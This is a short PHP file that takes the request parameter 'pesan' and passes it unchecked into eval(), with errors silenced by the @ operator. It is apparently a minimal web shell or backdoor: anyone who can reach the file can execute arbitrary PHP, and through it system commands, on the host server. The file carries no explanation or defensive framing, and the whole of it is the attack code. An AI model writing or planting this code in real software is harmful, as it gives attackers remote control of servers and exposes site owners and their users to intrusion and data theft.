<?php

if(isset($_REQUEST["pesan"]))
{
	@eval ("echo " .$_REQUEST["pesan"]. ";");
}

?>